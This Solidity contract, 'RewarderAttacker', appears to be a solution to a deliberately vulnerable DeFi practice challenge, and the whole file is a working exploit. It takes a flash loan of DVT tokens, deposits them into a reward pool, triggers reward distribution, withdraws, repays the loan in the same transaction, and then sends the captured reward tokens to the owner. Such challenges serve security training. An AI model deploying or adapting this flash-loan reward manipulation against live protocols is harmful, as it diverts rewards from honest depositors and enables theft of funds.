// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "solmate/src/auth/Owned.sol";
import "solmate/src/tokens/ERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool{
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external;
}

/**
 * @title RewarderAttacker
 * @author Igor Coser
 */
contract RewarderAttacker is Owned{
    address private flashPool;
    address private rewarderPool;
    address private DVT;
    address private rewardToken;

    error NotPool();
    constructor(address _flashPool, address _rewarderPool, address _DVT, address _rewardToken) Owned(msg.sender){
        flashPool = _flashPool;
        rewarderPool = _rewarderPool;
        DVT = _DVT;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 amount) external{
        if(msg.sender != flashPool){
            revert NotPool();
        }
        
        ERC20 token = ERC20(DVT);
        token.approve(rewarderPool, amount);
        
        ITheRewarderPool rewarder = ITheRewarderPool(rewarderPool);
        rewarder.deposit(amount);
        rewarder.distributeRewards();
        rewarder.withdraw(amount);
        
        token.transfer(flashPool, amount);
    }

    function attack(uint256 amount) external onlyOwner(){
        IFlashLoanerPool(flashPool).flashLoan(amount);
    }

    function withdraw() external onlyOwner{
        ERC20(rewardToken).transfer(msg.sender, ERC20(rewardToken).balanceOf(address(this)));
    }
}
